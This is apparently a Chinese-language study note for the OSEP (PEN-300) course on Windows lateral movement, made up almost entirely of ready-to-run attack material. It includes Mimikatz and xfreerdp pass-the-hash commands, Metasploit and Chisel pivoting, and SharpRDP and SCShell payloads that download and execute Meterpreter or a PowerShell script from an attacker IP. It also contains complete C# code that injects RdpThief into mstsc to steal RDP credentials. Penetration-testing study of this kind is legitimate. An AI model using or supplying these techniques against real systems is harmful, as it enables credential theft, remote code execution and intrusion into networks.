---
title: OSEP-14-Windows横向移动
description: '14-横向移动 | 03-Windows横向移动'
pubDate: 2026-01-30T00:02:18+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Active Directory
  - Lateral Movement
---

# Windows横向移动技术

## 1. RDP横向移动

### 基本RDP连接
```cmd
mstsc.exe
```

### 使用受限管理模式 (不缓存凭证)
```cmd
mstsc.exe /restrictedadmin
```

### 使用Mimikatz进行Pass-the-Hash RDP
```
# 使用NTLM哈希启动mstsc
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

### 启用受限管理模式
```powershell
# 通过PowerShell远程启用
Enter-PSSession -Computer appsrv01
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
Exit
```

### 删除受限管理模式设置
```powershell
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
```

### 使用xfreerdp进行Pass-the-Hash
```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

---

## 2. Metasploit反向代理RDP

### 配置自动路由和SOCKS代理
```
# 使用autoroute模块
use multi/manage/autoroute
set session 1
exploit

# 启动SOCKS代理
use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit -j
```

### 配置Proxychains
```bash
# 添加SOCKS代理到配置文件
sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'

# 通过代理连接RDP
proxychains rdesktop 192.168.120.10
```

---

## 3. Chisel反向代理

### 安装Golang并编译Chisel
```bash
# 安装Golang
sudo apt install golang

# 克隆Chisel
git clone https://github.com/jpillora/chisel.git
cd chisel/

# 编译Linux版本
go build

# 交叉编译Windows版本
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

### 启动Chisel服务器 (Kali)
```bash
./chisel server -p 8080 --socks5
```

### 配置SSH SOCKS代理
```bash
# 启用密码认证
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config

# 启动SSH服务
sudo systemctl start ssh.service

# 创建SOCKS代理
ssh -N -D 0.0.0.0:1080 localhost
```

### 启动Chisel客户端 (Windows)
```cmd
chisel.exe client 192.168.119.120:8080 socks
```

### 通过代理连接RDP
```bash
sudo proxychains rdesktop 192.168.120.10
```

---

## 4. SharpRDP命令行RDP

### 基本命令执行
```cmd
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
```

### 下载并执行Meterpreter
```cmd
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```

---

## 5. RdpThief凭证窃取

### DLL注入代码 (C#)
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dllName = "C:\\Tools\\RdpThief.dll";

            // 持续监控mstsc进程
            while (true)
            {
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                {
                    for (int i = 0; i < mstscProc.Length; i++)
                    {
                        int pid = mstscProc[i].Id;

                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }
                Thread.Sleep(1000);
            }
        }
    }
}
```

### 读取窃取的凭证
```cmd
type C:\Users\dave\AppData\Local\Temp\6\data.bin
```

---

## 6. 无文件横向移动 (SCShell)

### 服务控制管理器横向移动 (C#)
```csharp
using System;
using System.Runtime.InteropServices;

namespace lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            String target = "appsrv01";

            // 连接到服务控制管理器
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            // 打开现有服务
            string ServiceName = "SensorService";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            // 修改服务二进制路径
            string payload = "notepad.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            // 启动服务
            bResult = StartService(schService, 0, null);
        }
    }
}
```

### 使用PowerShell下载执行
```csharp
// 修改payload为PowerShell下载cradle
string payload = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.120/shell.ps1')\"";
```

---

## 7. Pass-the-Hash启动PowerShell

```
# 使用Mimikatz启动PowerShell
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

### 通过PSRemoting执行命令
```powershell
Enter-PSSession -Computer appsrv01
```
